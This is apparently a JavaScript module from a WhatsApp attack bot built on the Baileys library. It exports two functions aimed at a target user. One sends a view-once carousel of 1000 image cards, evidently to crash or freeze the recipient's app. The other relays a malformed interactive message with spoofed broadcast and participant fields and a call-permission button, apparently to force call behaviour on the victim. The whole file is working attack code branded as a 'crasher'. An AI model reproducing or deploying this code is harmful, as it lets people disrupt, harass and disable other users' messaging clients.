const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const ImgCrL = fs.readFileSync('./ImgCrL.jpg')

async function carousels2(client, isTarget, fJids) {
  const cards = [];
  const media = await prepareWAMessageMedia(
    { image: ImgCrL },
    { upload: client.waUploadToServer });
    
    const header = proto.Message.InteractiveMessage.Header.fromObject({
        imageMessage: media.imageMessage,
        title: '𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂',
        gifPlayback: false,
        subtitle: '𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂',
        hasMediaAttachment: true
    });
    
    for (let r = 0; r < 1000; r++) {
        cards.push({
            header,
            body: {
                text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
            },
            nativeFlowMessage: {
                buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "view",
                        url: "https://example.com"
                    })
                }
                ]
            }
        });
    }
    
    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                    },
                    footer: {
                        text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                    },
                    carouselMessage: {
                        cards,
                        messageVersion: 1
                    }
                }
            }
        }
    },
    {});
    
    await client.relayMessage(isTarget,
    msg.message, fJids ? {
        participant: { 
            jid: isTarget, 
            messageId: null 
        }
    }: {});
}

async function forceCall(client, isTarget) {
    let msg = await generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    contextInfo: {
                        expiration: 1,
                        ephemeralSettingTimestamp: 1,
                        entryPointConversionSource: "WhatsApp.com",
                        entryPointConversionApp: "WhatsApp",
                        entryPointConversionDelaySeconds: 1,
                        disappearingMode: {
                            initiatorDeviceJid: isTarget,
                            initiator: "INITIATED_BY_OTHER",
                            trigger: "UNKNOWN_GROUPS"
                        },
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        mentionedJid: [isTarget],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 1,
                                expiryTimestamp: null
                            }
                        },
                        externalAdReply: {
                            showAdAttribution: true,
                            renderLargerThumbnail: true
                        }
                    },
                    body: {
                        text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                    },
                    nativeFlowMessage: {
                        buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                status: true,
                                criador: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                                versao: "@latest",
                                atualizado: "2025-04-15",
                                suporte: "https://wa.me/6285727819741",
                                comandosDisponiveis: [`pp`],
                                prefixo: `pler`,
                                linguagem: "id"
                            }) + "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: JSON.stringify({
                                status: true,
                                criador: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                                versao: "@latest",
                                atualizado: "2025-04-15",
                                suporte: "https://wa.me/6285727819741",
                                comandosDisponiveis: [`p`],
                                prefixo: `pler`,
                                linguagem: "id"
                            }) + "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
                        },
                        ],
                    },
                },
            },
        },
    },
    {});
    
    await client.relayMessage(isTarget, msg.message, {
        participant: { 
            jid: isTarget 
        },
        messageId: msg.key.id
    });
} 

module.exports = { forceCall, carousels2 }